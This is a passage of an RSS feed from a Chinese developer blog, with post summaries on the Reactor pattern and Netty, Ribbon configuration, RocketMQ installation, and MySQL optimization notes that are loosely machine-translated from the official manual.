首先简单介绍Reactor 是什么东西、 其次解决什么问题、 领域应用、 原理、 优点和缺点、  1、简介 2、解决问题 ## 3、领域应用 ## 举个比较熟悉的例子 dubbo dubbo底层使用了netty线程模型 netty 中使用了reactor模式
那么什么是reactor模式？ ### Reactor三种模型 ### Netty线程模型 ### Netty结构 ### dubbo中使用的netty 4、Reactor 原理介绍 ## 4.1 Reactor模式结构 ### 4.2Reactor模式模块之间的交互 5、 Reactor优点 ## Reactor An Object Behavioral Pattern for Demultiplexing and Dispatching Handles for Synchronous Events 解耦、提升复用性、模块化、可移植性、事件驱动、细力度的并发控制等。 相比 传统的实现、即线程的切换、同步、数据的移动会引起性能问题。也就是说从性能的角度上，它最大的提升就是减少了性能的使用，即不需要每个Client对应一个线程
关于 减少使用线程使用 对性能提升的影响 可看这篇论文
SEDA: Staged Event-Driven Architecture - An Architecture for Well-Conditioned, Scalable Internet Service</description>
    </item>
    
    <item>
      <title>Ribbon</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/ribbon/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/ribbon/</guid>
      <description>官方wiki地址：https://github.com/Netflix/ribbon/wiki
功能简介： * 1、多重和可插入的负载平衡 * 2、与eureka服务整合 * 3、内置故障发现能力 * 4、云启用 * 5、与负载均衡器集成客户端 * 6、Archaius配置驱动客户端工厂
三个子项目：
 ribbon-core：包括负载均衡器和客户端接口定义、通用负载均衡器实现、客户端与负载均衡器和客户端工厂集成 ribbon-eureka：包含基于Eureka客户端的负载均衡器实现、这是用于服务注册和发现的liberary ribbon-httpclient：包含基于JSR-311的Rest客户端与服务均衡器集成的实现  配置 sample-client.properties
# Max number of retries on the same server (excluding the first try) sample-client.ribbon.MaxAutoRetries=1 # Max number of next servers to retry (excluding the first server) sample-client.ribbon.MaxAutoRetriesNextServer=1 # Whether all operations can be retried for this client sample-client.ribbon.OkToRetryOnAllOperations=true # Interval to refresh the server list from the source sample-client.</description>
    </item>
    
    <item>
      <title>RocketMQ</title>
      <link>https://www.wuxinvip.com/blog/message-queue/rocketmq/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/message-queue/rocketmq/</guid>
      <description>解决问题
分布式各系统之间的消息通讯【一般用来解决事务性提交】  应用场景
各模块之间 消息调用、 高并发的数据落地 事务解决方案  使用方式
我的开源服务中集成代码
message-queue 模块
安装
curl -L -O https://github.com/alibaba/rocketmq/archive/v3.5.8.zip unzip v3.5.8.zip -d rocketmq  原理
xmind文档
生产环境遇到的问题
消息阻塞【扩consumer、查看log 是什么原因导致消息阻塞】 消息长时间不到达【优先级策略】 消息确认机制会影响消息消费速度、虽然保证了每条消费一次  </description>
    </item>
    
    <item>
      <title>SQL优化【InnoDB-表优化】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-innodb/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-innodb/</guid>
      <description>innodb表优化
8.5.1优化InnoDB表的存储布局
一旦数据达到稳定的大小，或者增长表增加了几十或几百兆字节，请考虑使用该OPTIMIZE TABLE语句来重新组织表并压缩任何浪费的空间。 重新组织的表需要更少的磁盘I / O来执行全表扫描。 当其他技术（如改进索引使用或调整应用程序代码）不切实际时，这是一种直接技术，可以提高性能。 OPTIMIZE TABLE复制表格的数据部分并重建索引。 好处来自改进索引内数据的打包，并减少表空间和磁盘内的碎片。 好处取决于每个表中的数据。 您可能会发现某些人有显着的收益，而不是其他人，或者收益会随着时间的推移而下降，直到您再次优化表。 如果表很大或者重建的索引不适合缓冲池，则此操作可能会很慢。 向表中添加大量数据后的第一次运行通常比后期运行慢得多。 在中InnoDB，有一个很长的PRIMARY KEY（无论是一个长的值的单个列，还是多个形成一个长复合值的列）浪费了大量的磁盘空间。 一行中的主键值在所有指向同一行的二级索引记录中都是重复的。 （请参见第14.8.2.1节“集群索引和二级索引”。 ）AUTO_INCREMENT如果主键很长，或者索引长VARCHAR列的前缀而不是整列，则创建一个列作为主键。 使用VARCHAR数据类型而不是CHAR存储可变长度的字符串或具有多个NULL值的列 。 甲 列总是占据字符来存储数据，即使该字符串是较短，或者其值 。 较小的表适合缓冲池，并减少磁盘I / O。 CHAR(N)NNULL 使用COMPACT行格式（默认InnoDB格式）和可变长度字符集（如 utf8或）时sjis， 列占用可变数量的空间，但仍至少为字节。 CHAR(N)N 对于大的表或者包含大量重复的文本或数字数据的表，请考虑使用 COMPRESSED行格式。 将数据带入缓冲池或执行全表扫描需要较少的磁盘I / O。 在做出永久性决定之前，请测量使用行格式COMPRESSED与 您可以实现的压缩量 COMPACT。  8.5.2优化InnoDB事务管理
要优化InnoDB事务处理，请在事务功能的性能开销和服务器的工作负载之间找到理想的平衡点。 例如，如果应用程序每秒提交数千次，则应用程序可能会遇到性能问题，如果应用程序每2-3小时提交一次，则会出现不同的性能问题。 默认的MySQL设置AUTOCOMMIT=1 可能会对繁忙的数据库服务器造成性能限制。 在可行的情况下，在进行所有更改后，通过发布SET AUTOCOMMIT=0或START TRANSACTION声明将几个相关的数据更改操作包括到单个事务中 ，然后包含 COMMIT声明。 InnoDB如果该事务对数据库进行了修改，则必须在每次事务提交时将日志刷新到磁盘。 当每次更改之后都进行提交（与默认的自动提交设置一样）时，存储设备的I / O吞吐量会对每秒潜在操作的数量设置上限。 或者，对于仅由单个SELECT语句组成的事务，开启AUTOCOMMIT有助于 InnoDB识别只读事务并优化它们。 有关要求，请参见 第8.5.3节“优化InnoDB只读事务”。 避免在插入，更新或删除大量行后执行回滚。 如果一个大事务正在降低服务器的性能，那么回滚会导致问题变得更糟，可能需要几次才能执行原始数据更改操作。 杀死数据库进程无济于事，因为在服务器启动时会再次开始回滚。 为了尽量减少发生此问题的机会： 增加缓冲池的大小， 以便可以缓存所有数据更改更改，而不是立即写入磁盘。 设置 innodb_change_buffering=all 以便更新和删除操作在插入之外进行缓冲。 考虑COMMIT在大数据更改操作期间定期发布语句，可能会将单个删除或更新分为多个在较少数量的行上操作的语句。 为避免出现失控回滚，请增加缓冲池，以便回滚变为受CPU限制且运行速度很快，或者innodb_force_recovery=3按照第14.</description>
    </item>
    
    <item>
      <title>SQL优化【MyISAM-表优化】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-myisam/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-myisam/</guid>
      <description>8.6.1优化MyISAM查询
加快查询MyISAM表的一些常规提示 ： 为了帮助MySQL更好地优化查询，请使用 ANALYZE TABLE或运行 myisamchk -在载入数据之后对其进行分析。 这会更新每个索引部分的值，以指示具有相同值的平均行数。 （对于唯一索引，这总是1.）当你基于非常量表达式连接两个表时， MySQL使用它来决定选择哪个索引。 您可以通过使用和检查值来检查表格分析的结果 。 myisamchk --description --verbose显示索引分布信息。 SHOW INDEX FROM tbl_nameCardinality 要根据索引对索引和数据进行排序，请使用 myisamchk --sort-index --sort-records = 1 （假设您要对索引1进行排序）。 如果您有一个唯一索引，您希望根据索引按顺序读取所有行，则这是一种更快查询的好方法。 第一次以这种方式排列大表时，可能需要很长时间。 尽量避免SELECT 对MyISAM经常更新的表进行复杂的查询，以避免由于读者和作者之间的争用而发生的表锁定问题。 MyISAM支持并发插入：如果一个表在数据文件中间没有空闲块，那么可以INSERT在其他线程从表中读取数据的同时将新行插入到它中。 如果能做到这一点很重要，请考虑以避免删除行的方式使用表。 另一种可能性是OPTIMIZE TABLE在删除了很多行之后运行对表进行碎片整理。 这种行为是通过设置concurrent_insert变量来改变的 。 您可以强制添加新行（因此允许并发插入），即使在已删除行的表中也是如此。 请参见第8.11.3节“并发插入”。 对于MyISAM频繁更改的表，尽量避免所有变长列（VARCHAR， BLOB，和 TEXT）。 如果该表甚至包含单个可变长度列，该表使用动态行格式。 请参阅第15章，备用存储引擎。 仅仅因为行变大，将表分割成不同的表通常是没有用的。 在访问行时，最大的性能影响是找到行的第一个字节所需的磁盘查找。 找到数据后，大多数现代磁盘可以为大多数应用程序快速读取整行。 分割表格的唯一情况是，如果它是一个MyISAM使用动态行格式的 表格，您可以更改为固定的行大小，或者您经常需要扫描表格但不需要大多数列。 请参阅第15章，备用存储引擎。 如果您通常按顺序检索行， 请使用它 。 在对表格进行大量更改后使用此选项，您可能会获得更高的性能。 ALTER TABLE ... ORDER BY expr1, expr2, ...expr1, expr2, ... 如果您经常需要根据来自很多行的信息计算结果（如计数），则最好引入一个新表并实时更新计数器。 以下表单的更新速度非常快： UPDATE tbl_nameSET count_col= count_col+1 WHERE key_col= constant; 当你使用MySQL存储引擎时，这是非常重要的，例如MyISAM只有表级锁定（多个读者使用单个编写器）。 这也为大多数数据库系统提供了更好的性能，因为在这种情况下行锁管理器不太容易。 OPTIMIZE TABLE 定期 使用以避免使用动态格式MyISAM表进行分段 。 请参见 第15.</description>
    </item>
    
    <item>
      <title>SQL优化【SQL索引】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-indexes/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-indexes/</guid>
      <description>提高操作性能的最佳方法 SELECT是在查询中测试的一列或多列上创建索引。 索引条目就像指向表行的指针，允许查询快速确定哪些行与WHERE子句中的条件匹配，并检索这些行的其他列值。 所有的MySQL数据类型都可以被索引。
尽管为查询中使用的每个可能的列创建索引是很诱人的，但不必要的索引会浪费空间并浪费时间让MySQL确定要使用的索引。 索引还会增加插入，更新和删除的成本，因为每个索引都必须更新。 您必须找到适当的平衡，才能使用最佳索引集实现快速查询。
8.3.1 MySQL如何使用索引
索引用于快速查找具有特定列值的行。 如果没有索引，MySQL必须从第一行开始，然后读取整个表以查找相关行。 表格越大，成本越高。 如果表中有相关​​列的索引，MySQL可以快速确定在数据文件中间寻找的位置，而无需查看所有数据。 这比按顺序读取每一行要快得多。 大多数MySQL索引（PRIMARY KEY， UNIQUE，INDEX和 FULLTEXT）存储在 B树。 例外：空间数据类型的索引使用R树; MEMORY 表还支持散列索引 ; 索引InnoDB使用倒排列表FULLTEXT。 一般来说，索引的使用将在下面的讨论中描述。 第8.3.8节“B树和散列索引的比较”MEMORY中描述了特定于散列索引的特性（如表中所用 ） 。 MySQL使用这些操作的索引： WHERE快速 查找与子句匹配的行。 考虑排除行。 如果在多个索引之间有选择，MySQL通常使用找到最少行数的索引（最具 选择性的索引）。 如果表具有多列索引，则优化器可以使用该索引的任何最左边的前缀来查找行。 例如，如果你有一个三列索引上 (col1, col2, col3)，你有索引的搜索功能(col1)， (col1, col2)以及(col1, col2, col3)。 有关更多信息，请参见 第8.3.5节“多列索引”。 在执行连接时从其他表中检索行。 如果它们被声明为相同的类型和大小，MySQL可以更有效地在列上使用索引。 在这种情况下， VARCHAR与 CHAR被认为是相同的，如果它们被声明为相同的大小。 例如， VARCHAR(10)和 CHAR(10)大小相同，但 VARCHAR(10)与 CHAR(15)不是。 为了比较非二进制字符串列，两列应使用相同的字符集。 例如，将utf8列与 latin1列进行比较将排除索引的使用。 比较不同的列（例如，比较字符串列与时间或数字列）可能会阻止使用索引，如果无法直接比较值而不进行转换。 对于给定的值，如1 在数值列，它可能比较等于在字符串列，例如任何数量的值 &#39;1&#39;，&#39; 1&#39;， &#39;00001&#39;，或&#39;01.e1&#39;。 这排除了字符串列的任何索引的使用。 查找特定索引列的值MIN()或 MAX()值key_col。 这由预处理器进行了优化，该预处理器检查您是否使用 索引中之前发生的所有关键部件。 在这种情况下，MySQL会为每个表达式或 单个表达式执行单键查找，并用常量替换它。 如果所有表达式都被常量替换，则查询立即返回。 例如： WHERE key_part_N = constantkey_colMIN()MAX() SELECT MIN（key_part2），MAX（key_part2） FROM tbl_nameWHERE key_part1= 10; 如果排序或分组是在可用索引的最左侧前缀（例如，）上完成，则对表排序或分组 。 如果所有关键部件都紧随其后，则按相反的顺序读取钥匙。 请参见 第8.</description>
    </item>
    
    <item>
      <title>SQL优化【SQL语句】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-sentence/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-sentence/</guid>
      <description>1、select语句
1、删除无效括号【为了增加运算速度牺牲的可读性、mysql会做类似优化】 2、持续折叠 3、恒定条件去除【为了更好的逻辑可读性重复字段=固定值】 4、及时检测无效常量表达式 5、关于havingwhere 、如果不与group by、或者count、min、等聚合函数一起使用、尽量不要使用 6、where 表达式尽量简单、便于快速建立where评估表 7、查询其他表之前首先查询所有常量表 【 SELECT * FROM t WHERE primary_key=1; SELECT * FROM t1,t2 WHERE t1.primary_key=1 AND t2.primary_key=t1.id; 】  2、范围优化 对于两种索引结构使用不同的范围条件【hash索引、B树索引】 ==========mmp 太难了 没办法写下去 只能贴图了 以后慢慢品鉴</description>
    </item>
    
    <item>
      <title>SQL优化【总方向】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-total/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-total/</guid>
      <description>老生常谈 SQL 优化 而且一百度一堆，却没有一个令人满意的
秉承官方文档 原则 【MYSQL第八章 SQL优化】
优化方向： SQL查询and存储
sql语句 sql索引 sql数据库结构 sql表【InnoDb表、MyISAM表、Memory表】  缓存
查询优化器 缓冲和高速缓冲区  锁
优化锁定操作  MYSQL服务器
系统因素-并发量 磁盘IO 内存使用 网络使用  检查
检查线程信息  </description>
    </item>
    
    <item>
      <title>SQL优化【数据结构】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-data-structure/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-data-structure/</guid>
      <description>在作为数据库设计师的角色中，寻找组织模式，表和列的最有效方式。 与调整应用程序代码时一样，您可以最大限度地减少I / O，将相关项目集中在一起，并提前进行计划， 以便随着数据量的增加性能保持在较高水平 从高效的数据库设计开始， 团队成员可以更轻松地编写高性能的应用程序代码，并使数据库可以随应用程序的演变和重写而持续下去。
8.4.1优化数据大小
设计您的表格以尽量减少磁盘空间。 这可以通过减少写入和读取磁盘的数据量来实现巨大的改进。 在查询执行期间，较小的表格通常需要较少的主存储器，而其内容正在被主动处理。 表数据的任何空间减少也会导致可以更快处理的更小的索引。 MySQL支持许多不同的存储引擎（表格类型）和行格式。 对于每个表格，您可以决定使用哪种存储和索引方法。 为您的应用程序选择适当的表格格式可以为您带来巨大的性能提升。 请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。 通过使用此处列出的技术，您可以获得更好的表格性能并最小化存储空间： 表列 行格式 索引 加盟 正常化 表列 尽可能使用最有效（最小）的数据类型。 MySQL有很多专门的类型可以节省磁盘空间和内存。 例如，如果可能的话，使用较小的整数类型来获得较小的表格。 MEDIUMINT通常是一个更好的选择，INT因为一 MEDIUMINT列使用的空间减少了25％。 NOT NULL如果可能的话， 声明列。 通过更好地使用索引并消除测试每个值是否存在开销，它使SQL操作更快NULL。 您还可以节省一些存储空间，每列一位。 如果您真的需要NULL表格中的值，请使用它们。 只需避免允许NULL每列中的值的默认设置 。 行格式 InnoDB表格DYNAMIC默认使用行格式创建 。 要在a 或语句中明确使用除了DYNAMIC，配置 innodb_default_row_format或指定ROW_FORMAT选项以外的行格式。 CREATE TABLEALTER TABLE 行格式的紧凑系列，其中包括 COMPACT，DYNAMIC和COMPRESSED，以减少某些操作的CPU使用为代价来减少行存储空间。 如果您的工作负载是受缓存命中率和磁盘速度限制的典型负载，则可能会更快。 如果这是一个受CPU速度限制的罕见情况，则可能会变慢。 紧凑的行格式系列还可以CHAR在使用诸如utf8mb3或的可变长度字符集时优化 列存储 utf8mb4。 使用ROW_FORMAT=REDUNDANT， 占用字符集的最大字节长度×。 许多语言主要使用单字节字符编写 ，因此固定的存储长度通常会浪费空间。 使用紧凑的行格式系列，可在to 范围内分配可变数量的存储空间 CHAR(N)Nutf8InnoDBNN×通过去除尾部空格来为这些列设置字符集的最大字节长度。 最小存储长度为 N字节，便于在典型情况下进行就地更新。 有关更多信息，请参见 第14.8.1.2节“InnoDB表的物理行结构”。 要通过以压缩形式存储表数据来进一步减少空间，请ROW_FORMAT=COMPRESSED在创建InnoDB表时 指定 ，或在现有表上运行 myisampack命令 MyISAM。 （InnoDB压缩表是可读可写的，而MyISAM压缩表是只读的。 ） 对于MyISAM表中，如果没有任何可变长度列（VARCHAR， TEXT，或 BLOB列），一个固定大小的行格式被使用。 这会更快，但可能会浪费一些空间。 请参见第15.</description>
    </item>
    
    <item>
      <title>SQL优化【服务器优化】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-system/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-system/</guid>
      <description>本节讨论数据库服务器的优化技术，主要处理系统配置而不是调整SQL语句。 本节中的信息适用于想要确保他们管理的服务器的性能和可扩展性的DBA; 对于构建包括设置数据库的安装脚本的开发人员; 以及那些希望最大限度提高自身生产力的开发，测试等人员自己运行MySQL。
 8.12.1系统因素  一些系统级因素可能会以主要方式影响性能： 如果有足够的RAM，则可以删除所有交换设备。 某些操作系统在某些情况下使用交换设备，即使您拥有可用内存。 避免对MyISAM表格进行外部锁定 。 默认值是禁用外部锁定。 在 --external-locking和 --skip-external-locking 选项明确地启用和禁用外部锁定。 只要您只运行一台服务器，禁用外部锁定不会影响MySQL的功能。 请记住在运行myisamchk之前取下服务器（或者锁定并冲洗相关的表格） 。 在某些系统中，强制禁用外部锁定是因为它无法工作。 唯一不能禁用外部锁定的情况是在 同一数据上运行多个MySQL 服务器（而不是客户端），或者如果您运行 myisamchk检查（而不是修复）表而不告知服务器先刷新和锁定表。 请注意 ，除了使用NDB群集时，通常不建议使用多个MySQL服务器同时访问相同的数据。 该LOCK TABLES和 UNLOCK TABLES语句使用内部锁定，所以你可以使用他们，即使外部锁定被禁用。   8.12.2优化磁盘I / O  本节介绍如何在您将更多更快的存储硬件投入数据库服务器时配置存储设备。 有关优化 InnoDB配置以提高I / O性能的信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。 磁盘寻求是一个巨大的性能瓶颈。 当数据量开始变得如此之大以至于不能有效缓存时，这个问题就会变得更加明显。 对于您可以随意访问数据的大型数据库，您可以确保至少需要一次磁盘查找以及一些磁盘写入操作。 为了尽量减少这个问题，请使用低寻道时间的磁盘。 通过将文件符号链接到不同的磁盘或剥离磁盘来增加可用磁盘主轴的数量（从而减少查找开销）： 使用符号链接 这意味着，对于MyISAM表，您可以将索引文件和数据文件从其在数据目录中的常用位置符号链接到另一个磁盘（也可以是条带化的）。 这使得查找和读取时间更好，假设磁盘也不用于其他目的。 参见 第8.12.3节“使用符号链接”。 符号链接不支持与InnoDB表一起使用 。 但是，可以将InnoDB数据和日志文件放置在不同的物理磁盘上。 有关更多信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。 条带化 条带化意味着您有许多磁盘，并将第一个磁盘块，第二个磁盘上的第二个磁盘N块和（）磁盘上的第 - 个磁盘块，依此类推。 这意味着如果您的正常数据大小小于条带大小（或完全对齐），则可以获得更好的性能。 分条非常依赖操作系统和条带大小，因此可以用不同的条带大小对应用程序进行基准测试。 参见第8.13.2节“使用自己的基准”。 N MOD number_of_disks 对于分拆的速度差是 非常依赖的参数。 根据您设置条带参数和磁盘数量的方式，您可能会得到数量级差异。 您必须选择针对随机或顺序访问进行优化。 为了保证可靠性，您可能需要使用RAID 0 + 1（分条加镜像），但在这种情况下，您需要2个 N驱动器来保存 N数据驱动器。 如果你有钱，这可能是最好的选择。 但是，您可能还需要投资一些卷管理软件来有效处理它。 一个好的选择是根据数据类型的重要性来改变RAID级别。 例如，存储可在RAID 0磁盘上重新生成的半重要数据，但存储真正重要的数据，例如主机信息和日志记录在RAID 0 + 1或RAID N磁盘上。 N由于更新奇偶校验位所需的时间，如果您有很多写操作，则RAID 可能会成为问题。 您还可以设置数据库使用的文件系统的参数： 如果您不需要知道上次访问文件的时间（这在数据库服务器上并不真正有用），则可以使用该-o noatime 选项安装文件系统。 这会跳过对文件系统inode中最后一次访问时间的更新，从而避免一些磁盘搜索。 在许多操作系统上，可以通过将该-o async选项挂载来将文件系统设置为异步更新。 如果您的计算机相当稳定，这应该可以提供更好的性能而不会牺牲太多的可靠性。 （这个标志在Linux上默认打开。 ） 在MySQL中使用NFS 建议在考虑使用NFS与MySQL时谨慎。 潜在问题因操作系统和NFS版本而异，其中包括： 放置在NFS卷上的MySQL数据和日志文件被锁定并无法使用。 例如，如果多个MySQL实例访问相同的数据目录，或由于停电等原因导致MySQL不正确关闭，则可能会出现锁定问题。 NFS版本4通过引入基于咨询和基于租约的锁定来解决潜在的锁定问题。 但是，不建议在MySQL实例中共享数据目录。 由于收到的消息乱序或网络流量丢失而​​导致数据不一致。 要避免此问题，请使用TCP hard和 intr安装选项。 最大文件大小限制。 NFS版本2客户端只能访问文件的最低2GB（带符号32位偏移量）。 NFS版本3客户端支持较大的文件（最多64位偏移量）。 支持的最大文件大小还取决于NFS服务器的本地文件系统。 在专业SAN环境或其他存储系统中使用NFS往往比在这种环境之外使用NFS提供更高的可靠性。 但是，SAN环境中的NFS可能比直接连接或总线连接的非循环存储要慢。 如果您选择使用NFS，建议使用NFS版本4或更高版本，与在部署到生产环境之前彻底测试NFS设置一样。   8.</description>
    </item>
    
    <item>
      <title>SQL优化【查询器优化·一】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-selector-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-selector-1/</guid>
      <description>8.8.1使用EXPLAIN优化查询  该EXPLAIN语句提供有关MySQL如何执行语句的信息： EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。 当EXPLAIN与可解释的语句一起使用时，MySQL会显示来自优化器的关于语句执行计划的信息。 也就是说，MySQL解释了它将如何处理该语句，包括有关表如何连接以及按何种顺序的信息。 有关使用 EXPLAIN获取执行计划信息的信息，请参见第8.8.2节“EXPLAIN输出格式”。 当EXPLAIN与 可解释的语句一起使用时，它显示在命名连接中执行的语句的执行计划。 请参见第8.8.4节“获取命名连接的执行计划信息”。 FOR CONNECTION connection_id 对于SELECT语句， EXPLAIN产生可以使用显示的附加执行计划信息 SHOW WARNINGS。 请参见 第8.8.3节“扩展EXPLAIN输出格式”。 EXPLAIN对于检查涉及分区表的查询很有用。 请参见 第22.3.5节“获取有关分区的信息”。 该FORMAT选项可用于选择输出格式。 TRADITIONAL以表格格式显示输出。 如果没有FORMAT选项，这是默认值 。 JSON格式以JSON格式显示信息。 在帮助下EXPLAIN，您可以看到应该在哪里添加索引，以便通过使用索引查找行来更快地执行语句。 您还可以 EXPLAIN用来检查优化程序是否以最佳顺序加入表。 为了给优化器提示使用与SELECT语句中命名表的顺序相对应的连接顺序 ，请使用SELECT STRAIGHT_JOIN而不是仅仅开始语句SELECT。 （请参见 第13.2.9节“SELECT语法”。）但是， STRAIGHT_JOIN可能会阻止使用索引，因为它会禁用半连接转换。 看到 第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。 优化器跟踪有时可以提供与之相辅相成的信息EXPLAIN。 但是，优化器跟踪格式和内容在版本之间可能会发生变化。 有关详细信息，请参阅 MySQL内部：跟踪优化器。 如果您在确定索引时没有使用索引时遇到问题，请运行ANALYZE TABLE以更新表格统计信息（如键的基数），这些索引可能会影响优化程序的选择。 请参见 第13.7.2.1节“ANALYZE TABLE语法”。 注意 EXPLAIN也可以用于获取有关表中列的信息。 是和的 同义词。 有关更多信息，请参见第13.8.1节“DESCRIBE语法”和 第13.7.5.5节“SHOW COLUMNS语法”。 EXPLAIN tbl_nameDESCRIBE tbl_nameSHOW COLUMNS FROM tbl_name   8.8.2 EXPLAIN输出格式  该EXPLAIN语句提供有关MySQL如何执行语句的信息。 EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。 EXPLAIN为SELECT语句中使用的每个表返回一行信息 。 它按照MySQL在处理语句时读取它们的顺序列出输出中的表。 MySQL使用嵌套循环连接方法解析所有连接。 这意味着MySQL从第一个表中读取一行，然后在第二个表，第三个表等中找到匹配的行。 处理完所有表后，MySQL将通过表列表输出所选列和回溯，直到找到有更多匹配行的表。 下一行从该表中读取，并且该过程继续下一个表。 EXPLAIN输出包括分区信息。 另外，对于SELECT 语句，EXPLAIN生成扩展信息，可以按照SHOW WARNINGS以下 方式显示 EXPLAIN（参见 第8.</description>
    </item>
    
    <item>
      <title>SQL优化【查询器优化·二】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-selector-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-selector-2/</guid>
      <description>8.9.1控制查询计划评估  查询优化器的任务是查找执行SQL查询的最佳计划。 由于“ 好 ”和“ 坏 ”之间的表现差异计划可以是数量级（即秒数与数小时甚至数天）， 大多数查询优化器（包括MySQL的查询优化器）在所有可能的查询评估计划中执行或多或少的穷举搜索优化计划。 对于连接查询，由MySQL优化器调查的可能计划的数量随着查询中引用的表的数量呈指数增长。 对于少量表格（通常小于7到10），这不是问题。 但是，当提交更大的查询时，查询优化花费的时间可能很容易成为服务器性能的主要瓶颈。 用于查询优化的更灵活的方法使用户能够控制优化器在搜索最优查询评估计划时的详尽程度。 总体思路是，优化程序调查的计划越少，编译查询花费的时间就越少。 另一方面，因为优化器跳过了一些计划，所以可能会错过找到最佳计划。 优化程序相对于其计算的计划数量的行为可以使用两个系统变量进行控制： 该optimizer_prune_level 变量告诉优化器根据每个表访问的行数的估计值跳过某些计划。 我们的经验表明，这种“ 受过教育的猜测 ”很少会错过最佳计划，并且可能大大减少查询编译时间。 这就是为什么这个选项optimizer_prune_level=1默认是on（）。 但是，如果您认为优化器错过了更好的查询计划，则可以关闭此选项（optimizer_prune_level=0）与查询编译可能花费更长时间的风险有关。 请注意，即使使用这种启发式，优化器仍然会探索大致指数级的计划。 这个optimizer_search_depth 变量告诉优化器应该看看每个不完整计划的“ 未来 ”有多远，以评估它是否应该进一步扩展。 较小的值 optimizer_search_depth可能会导致查询编译时间缩短几个数量级。 例如，如果optimizer_search_depth接近查询中的表的数量，具有12,13或更多表的查询可能很容易需要数小时甚至数天来编译 。 同时，如果编译一下 optimizer_search_depth 等于3或4，优化器可以在不到一分钟的时间内编译相同的查询。 如果您不确定合理的值是什么 optimizer_search_depth，则可以将此变量设置为0，以通知优化器自动确定该值。   8.9.2优化器提示  控制优化器策略的一种方法是设置 optimizer_switch系统变量（参见第* 8.9.3节“可切换优化”）。 对此变量的更改影响所有后续查询的执行; 为了对另一个查询产生不同的影响，有必要optimizer_switch在每个查询之前进行更改 。 另一种控制优化器的方式是使用优化器提示，它可以在单个语句中指定。 由于优化器提示适用于每个语句的基础上，因此它们提供了对语句执行计划的更好的控制，而不是使用的方式 optimizer_switch。 例如，您可以在语句中为一个表启用优化，并禁用针对其他表的优化。 语句中的提示优先于 optimizer_switch标志。 例子： SELECT / * + NO_RANGE_OPTIMIZATION（t3 PRIMARY，f2_idx）* / f1 FROM t3 where f1&amp;gt; 30 AND f1 &amp;lt;33; SELECT / * + BKA（t1）NO_BKA（t2）* / *从t1 INNER JOIN t2 WHERE .</description>
    </item>
    
    <item>
      <title>SQL优化【线程信息检查】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-thread/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-thread/</guid>
      <description>8.14.1线程命令值 8.14.2一般线程状态 8.14.3查询缓存线程状态 8.14.4复制主线程状态 8.14.5复制从站I / O线程状态 8.14.6复制从属SQL线程状态 8.14.7复制从站连接线程状态 8.14.8 NDB集群线程状态 8.14.9事件调度程序线程状态  当您试图确定MySQL服务器正在做什么时，检查进程列表会很有帮助，进程列表是当前在服务器中执行的线程集。可从以下来源获取流程列表信息：
该SHOW [FULL] PROCESSLIST语句： 第13.7.5.29，“SHOW PROCESSLIST语法”
该SHOW PROFILE语句： 第13.7.5.31，“显示配置文件语法”
该INFORMATION_SCHEMA PROCESSLIST表： 第24.17，“该INFORMATION_SCHEMA PROCESSLIST表”
在中mysqladmin processlist的命令： 第4.5.2节“ 中mysqladmin -客户端管理MySQL服务器”
性能模式threads 表，阶段表和锁定表： 第25.11.16节“性能模式杂项表”， 第25.11.5节“性能模式阶段事件表”， 第25.11.12节“性能模式锁定表”。
该sys架构 processlist视图，呈现从性能架构信息 threads表中更方便的格式：第26.4.3.22，“ProcessList中和X $ PROCESSLIST意见”
该sys架构 session视图，其中介绍有关用户会话的信息（如 sys架构 processlist视图，但是过滤掉后台进程）： 第26.4.3.33，“会议和X $会话视图”
访问threads不需要互斥锁，对服务器性能的影响最小。 INFORMATION_SCHEMA.PROCESSLIST并且SHOW PROCESSLIST因为它们需要互斥锁而 产生负面的性能影响。 threads还显示有关后台线程的信息，有哪些 INFORMATION_SCHEMA.PROCESSLIST， SHOW PROCESSLIST有时没有。这意味着threads可以用来监视其他线程信息源不能的活动。
